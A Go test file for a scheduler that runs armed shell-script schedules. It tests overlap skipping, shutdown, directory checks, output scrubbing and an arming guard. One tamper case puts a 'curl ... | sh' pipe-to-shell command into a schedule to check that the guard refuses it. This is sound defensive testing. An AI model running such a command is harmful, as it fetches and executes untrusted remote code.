package schedule

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"
)

type testClock struct {
	mu sync.Mutex
	t  time.Time
}

func (c *testClock) now() time.Time {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.t
}

func (c *testClock) set(t time.Time) {
	c.mu.Lock()
	c.t = t
	c.mu.Unlock()
}

// fakeScript is a ScriptRunner that records requests. With hold set it
// blocks after started until release is closed.
type fakeScript struct {
	mu      sync.Mutex
	reqs    []ScriptRequest
	result  ScriptResult
	refuse  bool // return result without calling started
	hold    bool
	release chan struct{}
	entered chan struct{}
}

func newFakeScript(result ScriptResult) *fakeScript {
	return &fakeScript{result: result, release: make(chan struct{}), entered: make(chan struct{}, 8)}
}

func (f *fakeScript) run(ctx context.Context, req ScriptRequest, started func(ScriptStart)) ScriptResult {
	f.mu.Lock()
	f.reqs = append(f.reqs, req)
	res := f.result
	f.mu.Unlock()
	if f.refuse {
		return res
	}
	started(ScriptStart{Decision: res.Decision, Sandbox: "off", StartedAt: res.StartedAt})
	f.entered <- struct{}{}
	if f.hold {
		<-f.release
	}
	return res
}

func (f *fakeScript) calls() []ScriptRequest {
	f.mu.Lock()
	defer f.mu.Unlock()
	return append([]ScriptRequest(nil), f.reqs...)
}

type auditLog struct {
	mu   sync.Mutex
	recs []ScriptAudit
}

func (a *auditLog) add(rec ScriptAudit) {
	a.mu.Lock()
	a.recs = append(a.recs, rec)
	a.mu.Unlock()
}

func (a *auditLog) statuses() []string {
	a.mu.Lock()
	defer a.mu.Unlock()
	out := make([]string, len(a.recs))
	for i, r := range a.recs {
		out[i] = r.Status
	}
	return out
}

func (a *auditLog) all() []ScriptAudit {
	a.mu.Lock()
	defer a.mu.Unlock()
	return append([]ScriptAudit(nil), a.recs...)
}

func finishedResult(t0 time.Time) ScriptResult {
	code := 0
	return ScriptResult{
		Status: StatusFinished, Decision: DecisionArmed, Sandbox: "off",
		StartedAt: t0, EndedAt: t0.Add(time.Second), ExitCode: &code, Output: []byte("ok\n"),
	}
}

func armedSpec(name string, armed time.Time) Spec {
	spec := scriptSpec(name)
	spec.ArmedAt = armed
	return spec
}

func findRunByID(t *testing.T, sch Schedule, id string) Run {
	t.Helper()
	for _, r := range sch.Runs {
		if r.ID == id {
			return r
		}
	}
	t.Fatalf("run %s not found in %+v", id, sch.Runs)
	return Run{}
}

func TestScriptFireOpensNoSession(t *testing.T) {
	t0 := time.Date(2026, 11, 20, 8, 0, 0, 0, time.UTC)
	cases := []struct {
		name   string
		mutate func(*Spec)
		setup  func(t *testing.T, svc *Service, id string)
		fireAt time.Time
	}{
		{name: "interval", mutate: func(s *Spec) { s.Kind = KindInterval; s.Every = "1h" }, fireAt: t0.Add(time.Hour)},
		{name: "cron", mutate: func(s *Spec) { s.Kind = KindCron; s.Every = ""; s.Cron = "0 * * * *" }, fireAt: t0.Add(time.Hour)},
		{name: "once", mutate: func(s *Spec) { s.Kind = KindOnce; s.Every = ""; s.At = t0.Add(30 * time.Minute) }, fireAt: t0.Add(30 * time.Minute)},
		{
			name:   "heartbeat",
			mutate: func(s *Spec) { s.Kind = KindHeartbeat; s.Every = "1h" },
			setup: func(t *testing.T, svc *Service, id string) {
				if _, err := svc.store.Mutate(id, func(s *Schedule) error { s.Fingerprint = "before"; return nil }); err != nil {
					t.Fatal(err)
				}
			},
			fireAt: t0.Add(time.Hour),
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			clock := &testClock{t: t0}
			starter := &recordingStarter{}
			script := newFakeScript(finishedResult(t0))
			log := &auditLog{}
			svc, err := Open(dir, Hooks{
				Now: clock.now, Starter: starter, Script: script.run, Audit: log.add,
				Busy:        func(string) bool { t.Fatal("session busy consulted for a script"); return false },
				Fingerprint: func(string) (string, error) { return "after", nil },
			}, dir)
			if err != nil {
				t.Fatal(err)
			}
			spec := armedSpec("nightly", t0)
			tc.mutate(&spec)
			sch, err := svc.Create(spec)
			if err != nil {
				t.Fatal(err)
			}
			if tc.setup != nil {
				tc.setup(t, svc, sch.ID)
			}
			clock.set(tc.fireAt)
			svc.Tick(context.Background(), false)
			svc.WaitScripts()

			if starter.count() != 0 {
				t.Fatalf("script fire opened %d root sessions", starter.count())
			}
			calls := script.calls()
			if len(calls) != 1 {
				t.Fatalf("runner calls = %d", len(calls))
			}
			req := calls[0]
			if req.Command != "make test" || req.Dir != dir || req.PermissionMode != "plan" || req.Timeout != 30*time.Minute ||
				req.CommandHash != HashCommand("make test") || req.ScheduleID != sch.ID || req.RunID == "" {
				t.Fatalf("request %+v", req)
			}
			got, _ := svc.Get(sch.ID)
			if got.LastSessionID != "" || got.LastStatus != StatusFinished || got.LastError != "" {
				t.Fatalf("schedule after fire: session=%q status=%q err=%q", got.LastSessionID, got.LastStatus, got.LastError)
			}
			run := findRunByID(t, got, req.RunID)
			if run.SessionID != "" || run.Status != StatusFinished || run.Decision != DecisionArmed ||
				run.ExitCode == nil || *run.ExitCode != 0 || run.OutputPreview != "ok\n" || run.OutputRef == "" ||
				run.StartedAt.IsZero() || run.EndedAt.IsZero() || run.PermissionMode != "plan" {
				t.Fatalf("run %+v", run)
			}
			out, err := svc.RunOutput(sch.ID, run.OutputRef)
			if err != nil || string(out) != "ok\n" {
				t.Fatalf("sidecar %q %v", out, err)
			}
			if st := log.statuses(); strings.Join(st, ",") != "started,finished" {
				t.Fatalf("audit statuses %v", st)
			}
			for _, rec := range log.all() {
				if rec.ScheduleID != sch.ID || rec.RunID != req.RunID || rec.CommandHash != sch.CommandHash ||
					rec.Command != "make test" || rec.Dir != dir || rec.Timeout != "30m" || rec.Mode != "plan" {
					t.Fatalf("audit record %+v", rec)
				}
			}
		})
	}
}

func TestScriptOverlapSkipsWhileInFlight(t *testing.T) {
	t0 := time.Date(2026, 11, 20, 8, 0, 0, 0, time.UTC)
	dir := t.TempDir()
	clock := &testClock{t: t0}
	script := newFakeScript(finishedResult(t0))
	script.hold = true
	log := &auditLog{}
	svc, err := Open(dir, Hooks{Now: clock.now, Script: script.run, Audit: log.add}, dir)
	if err != nil {
		t.Fatal(err)
	}
	sch, err := svc.Create(armedSpec("long", t0))
	if err != nil {
		t.Fatal(err)
	}
	clock.set(t0.Add(time.Hour))
	svc.Tick(context.Background(), false)
	<-script.entered // the process is "running"; the tick has returned
	first := script.calls()[0].RunID

	clock.set(t0.Add(2 * time.Hour))
	svc.Tick(context.Background(), false)
	if n := len(script.calls()); n != 1 {
		t.Fatalf("overlapping tick started a second run (%d calls)", n)
	}
	got, _ := svc.Get(sch.ID)
	if got.LastStatus != StatusSkipped || got.Runs[0].Status != StatusSkipped {
		t.Fatalf("second tick: last=%s run0=%s", got.LastStatus, got.Runs[0].Status)
	}
	if run := findRunByID(t, got, first); run.Status != StatusStarted || run.Decision != DecisionArmed || run.StartedAt.IsZero() {
		t.Fatalf("in-flight run changed: %+v", run)
	}
	if !got.NextFire.After(t0.Add(2 * time.Hour)) {
		t.Fatalf("skip did not advance the calendar: %s", got.NextFire)
	}
	if _, err := svc.RunNow(context.Background(), sch.ID); !errors.Is(err, ErrBusy) {
		t.Fatalf("RunNow while in flight = %v, want ErrBusy", err)
	}
	if st := log.statuses(); strings.Join(st, ",") != "started,skipped" {
		t.Fatalf("audit statuses %v", st)
	}

	close(script.release)
	svc.WaitScripts()
	got, _ = svc.Get(sch.ID)
	if run := findRunByID(t, got, first); run.Status != StatusFinished {
		t.Fatalf("first run after release: %+v", run)
	}
	if got.LastStatus != StatusFinished {
		t.Fatalf("last status %s", got.LastStatus)
	}
	if svc.scriptRunning(sch.ID) {
		t.Fatal("in-flight entry not released")
	}

	// Free again: RunNow detaches and returns the started run.
	run, err := svc.RunNow(context.Background(), sch.ID)
	if err != nil || run.Status != StatusStarted || run.SessionID != "" {
		t.Fatalf("RunNow = %+v, %v", run, err)
	}
	svc.WaitScripts()
	if n := len(script.calls()); n != 2 {
		t.Fatalf("calls = %d", n)
	}
	after, _ := svc.Get(sch.ID)
	if !after.NextFire.Equal(got.NextFire) {
		t.Fatal("RunNow moved the calendar")
	}
}

func TestScriptRunNowOutlivesRequestContext(t *testing.T) {
	t0 := time.Date(2026, 11, 20, 8, 0, 0, 0, time.UTC)
	dir := t.TempDir()
	var seen context.Context
	var mu sync.Mutex
	runner := func(ctx context.Context, req ScriptRequest, started func(ScriptStart)) ScriptResult {
		mu.Lock()
		seen = ctx
		mu.Unlock()
		res := finishedResult(t0)
		started(ScriptStart{StartedAt: t0})
		return res
	}
	svc, err := Open(dir, Hooks{Now: func() time.Time { return t0 }, Script: runner}, dir)
	if err != nil {
		t.Fatal(err)
	}
	sch, err := svc.Create(armedSpec("now", t0))
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	if _, err := svc.RunNow(ctx, sch.ID); err != nil {
		t.Fatal(err)
	}
	cancel()
	svc.WaitScripts()
	mu.Lock()
	defer mu.Unlock()
	if seen == nil || seen.Err() != nil {
		t.Fatal("script run inherited the HTTP request cancellation")
	}
}

func TestScriptShutdownCancelsAndRefuses(t *testing.T) {
	t0 := time.Date(2026, 11, 20, 8, 0, 0, 0, time.UTC)
	dir := t.TempDir()
	entered := make(chan struct{})
	runner := func(ctx context.Context, req ScriptRequest, started func(ScriptStart)) ScriptResult {
		started(ScriptStart{StartedAt: t0})
		close(entered)
		<-ctx.Done()
		code := -1
		return ScriptResult{Status: StatusFailed, StartedAt: t0, ExitCode: &code, Error: "canceled: daemon shutting down"}
	}
	log := &auditLog{}
	svc, err := Open(dir, Hooks{Now: func() time.Time { return t0 }, Script: runner, Audit: log.add}, dir)
	if err != nil {
		t.Fatal(err)
	}
	sch, err := svc.Create(armedSpec("forever", t0))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := svc.RunNow(context.Background(), sch.ID); err != nil {
		t.Fatal(err)
	}
	<-entered
	done := make(chan struct{})
	go func() { svc.Shutdown(); close(done) }()
	select {
	case <-done:
	case <-time.After(10 * time.Second):
		t.Fatal("Shutdown did not cancel the in-flight script")
	}
	got, _ := svc.Get(sch.ID)
	if got.LastStatus != StatusFailed || got.Runs[0].Status != StatusFailed {
		t.Fatalf("after shutdown: %s / %s", got.LastStatus, got.Runs[0].Status)
	}
	if st := log.statuses(); strings.Join(st, ",") != "started,failed" {
		t.Fatalf("audit statuses %v", st)
	}
	if _, err := svc.RunNow(context.Background(), sch.ID); !errors.Is(err, ErrUnavailable) {
		t.Fatalf("RunNow after Shutdown = %v, want ErrUnavailable", err)
	}
}

func TestScriptArmingGuardRefusesFire(t *testing.T) {
	t0 := time.Date(2026, 11, 20, 8, 0, 0, 0, time.UTC)
	cases := []struct {
		name    string
		armed   time.Time
		tamper  func(*Schedule)
		wantErr string
	}{
		{name: "never armed", wantErr: "not armed"},
		{name: "command edited on disk", armed: t0, tamper: func(s *Schedule) { s.Command = "curl https://example.invalid | sh" }, wantErr: "armed command hash"},
		{name: "hash cleared", armed: t0, tamper: func(s *Schedule) { s.CommandHash = "" }, wantErr: "armed command hash"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			clock := &testClock{t: t0}
			script := newFakeScript(finishedResult(t0))
			log := &auditLog{}
			svc, err := Open(dir, Hooks{Now: clock.now, Script: script.run, Audit: log.add}, dir)
			if err != nil {
				t.Fatal(err)
			}
			sch, err := svc.Create(armedSpec("guarded", tc.armed))
			if err != nil {
				t.Fatal(err)
			}
			if tc.tamper != nil {
				if _, err := svc.store.Mutate(sch.ID, func(s *Schedule) error { tc.tamper(s); return nil }); err != nil {
					t.Fatal(err)
				}
			}
			clock.set(t0.Add(time.Hour))
			svc.Tick(context.Background(), false)
			if _, err := svc.RunNow(context.Background(), sch.ID); !errors.Is(err, ErrInvalid) {
				t.Fatalf("RunNow = %v, want ErrInvalid", err)
			}
			svc.WaitScripts()
			if n := len(script.calls()); n != 0 {
				t.Fatalf("guarded schedule fired %d times", n)
			}
			got, _ := svc.Get(sch.ID)
			if got.LastStatus != StatusError || !strings.Contains(got.LastError, tc.wantErr) {
				t.Fatalf("status %q error %q", got.LastStatus, got.LastError)
			}
			if got.Runs[0].Status != StatusError || got.Runs[0].ExitCode != nil {
				t.Fatalf("run %+v", got.Runs[0])
			}
			if st := log.statuses(); strings.Join(st, ",") != "error,error" {
				t.Fatalf("audit statuses %v", st)
			}
		})
	}
}

func TestScriptUnavailableWithoutRunner(t *testing.T) {
	t0 := time.Date(2026, 11, 20, 8, 0, 0, 0, time.UTC)
	dir := t.TempDir()
	clock := &testClock{t: t0}
	log := &auditLog{}
	svc, err := Open(dir, Hooks{Now: clock.now, Starter: &recordingStarter{}, Audit: log.add}, dir)
	if err != nil {
		t.Fatal(err)
	}
	sch, err := svc.Create(armedSpec("orphan", t0))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := svc.RunNow(context.Background(), sch.ID); !errors.Is(err, ErrUnavailable) {
		t.Fatalf("RunNow = %v, want ErrUnavailable", err)
	}
	clock.set(t0.Add(time.Hour))
	svc.Tick(context.Background(), false)
	got, _ := svc.Get(sch.ID)
	if got.LastStatus != StatusError || got.LastError != "script runs unavailable" || got.Runs[0].Error != "script runs unavailable" {
		t.Fatalf("status %q error %q runs %+v", got.LastStatus, got.LastError, got.Runs)
	}
	if st := log.statuses(); strings.Join(st, ",") != "error" {
		t.Fatalf("audit statuses %v", st)
	}
}

func TestRunTicksWithOnlyScriptRunner(t *testing.T) {
	t0 := time.Date(2026, 11, 20, 8, 0, 0, 0, time.UTC)
	cases := []struct {
		name       string
		withScript bool
		want       string
	}{
		{name: "script runner only ticks", withScript: true, want: StatusMissed},
		{name: "no starter and no runner does not tick", withScript: false, want: ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			clock := &testClock{t: t0}
			script := newFakeScript(finishedResult(t0))
			log := &auditLog{}
			hooks := Hooks{Now: clock.now, Audit: log.add}
			if tc.withScript {
				hooks.Script = script.run
			}
			svc, err := Open(dir, hooks, dir)
			if err != nil {
				t.Fatal(err)
			}
			sch, err := svc.Create(armedSpec("startup", t0))
			if err != nil {
				t.Fatal(err)
			}
			clock.set(t0.Add(time.Hour))
			ctx, cancel := context.WithCancel(context.Background())
			cancel()
			svc.Run(ctx) // startup tick, then returns on the cancelled ctx
			svc.WaitScripts()
			got, _ := svc.Get(sch.ID)
			if got.LastStatus != tc.want {
				t.Fatalf("last status %q, want %q", got.LastStatus, tc.want)
			}
			if len(script.calls()) != 0 {
				t.Fatal("a missed startup slot fired")
			}
			if tc.want != "" {
				if st := log.statuses(); strings.Join(st, ",") != StatusMissed {
					t.Fatalf("audit statuses %v", st)
				}
			}
		})
	}
}

func TestScriptDirResolvedAndRecheckedAtFire(t *testing.T) {
	t0 := time.Date(2026, 11, 20, 8, 0, 0, 0, time.UTC)
	t.Run("workspace path when dir is empty", func(t *testing.T) {
		dir := t.TempDir()
		ws := t.TempDir()
		clock := &testClock{t: t0}
		script := newFakeScript(finishedResult(t0))
		svc, err := Open(dir, Hooks{Now: clock.now, Script: script.run, WorkDir: func(string) string { return ws }}, dir)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := svc.Create(armedSpec("ws", t0)); err != nil {
			t.Fatal(err)
		}
		clock.set(t0.Add(time.Hour))
		svc.Tick(context.Background(), false)
		svc.WaitScripts()
		if calls := script.calls(); len(calls) != 1 || calls[0].Dir != ws {
			t.Fatalf("calls %+v", calls)
		}
	})
	t.Run("dir removed after arming", func(t *testing.T) {
		dir := t.TempDir()
		work := filepath.Join(t.TempDir(), "work")
		if err := os.Mkdir(work, 0o700); err != nil {
			t.Fatal(err)
		}
		clock := &testClock{t: t0}
		script := newFakeScript(finishedResult(t0))
		svc, err := Open(dir, Hooks{Now: clock.now, Script: script.run}, dir)
		if err != nil {
			t.Fatal(err)
		}
		spec := armedSpec("gone", t0)
		spec.Dir = work
		sch, err := svc.Create(spec)
		if err != nil {
			t.Fatal(err)
		}
		if err := os.Remove(work); err != nil {
			t.Fatal(err)
		}
		clock.set(t0.Add(time.Hour))
		svc.Tick(context.Background(), false)
		svc.WaitScripts()
		if n := len(script.calls()); n != 0 {
			t.Fatalf("fired with a missing dir (%d calls)", n)
		}
		got, _ := svc.Get(sch.ID)
		if got.LastStatus != StatusError || !strings.HasPrefix(got.LastError, "dir:") {
			t.Fatalf("status %q error %q", got.LastStatus, got.LastError)
		}
		if svc.scriptRunning(sch.ID) {
			t.Fatal("refused fire left an in-flight entry")
		}
	})
}

func TestScriptOutcomeRecording(t *testing.T) {
	t0 := time.Date(2026, 11, 20, 8, 0, 0, 0, time.UTC)
	secret := "AKIAABCDEFGHIJKLMNOP"
	three := 3
	cases := []struct {
		name       string
		result     ScriptResult
		refuse     bool
		wantStatus string
		wantAudit  string
	}{
		{
			name: "non-zero exit fails with scrubbed tail",
			result: ScriptResult{Status: StatusFailed, Decision: DecisionAllow, StartedAt: t0, EndedAt: t0.Add(time.Second),
				ExitCode: &three, Output: []byte(strings.Repeat("line of output\n", 700) + "key " + secret + "\nFAIL last line"), Error: "exit code 3"},
			wantStatus: StatusFailed, wantAudit: "started,failed",
		},
		{
			name:       "permission deny never starts",
			result:     ScriptResult{Status: StatusDenied, Decision: DecisionDeny, Error: "denied by permission rules"},
			refuse:     true,
			wantStatus: StatusDenied, wantAudit: "denied",
		},
		{
			name:       "unknown runner status becomes error",
			result:     ScriptResult{Status: "weird"},
			refuse:     true,
			wantStatus: StatusError, wantAudit: "error",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			clock := &testClock{t: t0}
			script := newFakeScript(tc.result)
			script.refuse = tc.refuse
			log := &auditLog{}
			svc, err := Open(dir, Hooks{Now: clock.now, Script: script.run, Audit: log.add}, dir)
			if err != nil {
				t.Fatal(err)
			}
			sch, err := svc.Create(armedSpec("outcome", t0))
			if err != nil {
				t.Fatal(err)
			}
			clock.set(t0.Add(time.Hour))
			svc.Tick(context.Background(), false)
			svc.WaitScripts()
			got, _ := svc.Get(sch.ID)
			run := got.Runs[0]
			if got.LastStatus != tc.wantStatus || run.Status != tc.wantStatus {
				t.Fatalf("status last=%q run=%q", got.LastStatus, run.Status)
			}
			if st := log.statuses(); strings.Join(st, ",") != tc.wantAudit {
				t.Fatalf("audit statuses %v", st)
			}
			if len(run.OutputPreview) > maxRunPreview {
				t.Fatalf("preview %d bytes", len(run.OutputPreview))
			}
			if strings.Contains(run.OutputPreview, secret) {
				t.Fatal("preview leaked a credential-shaped token")
			}
			recs := log.all()
			last := recs[len(recs)-1]
			if strings.Contains(last.OutputTail, secret) {
				t.Fatal("audit tail leaked a credential-shaped token")
			}
			switch tc.wantStatus {
			case StatusFailed:
				if !strings.HasSuffix(run.OutputPreview, "FAIL last line") || run.ExitCode == nil || *run.ExitCode != 3 ||
					got.LastError != "exit code 3" || run.OutputRef == "" || last.ExitCode == nil || *last.ExitCode != 3 {
					t.Fatalf("failed run %+v last error %q", run, got.LastError)
				}
			case StatusDenied:
				if run.ExitCode != nil || run.Decision != DecisionDeny || run.OutputRef != "" || last.Decision != DecisionDeny {
					t.Fatalf("denied run %+v", run)
				}
			case StatusError:
				if !strings.Contains(run.Error, "weird") {
					t.Fatalf("error run %+v", run)
				}
			}
		})
	}
}
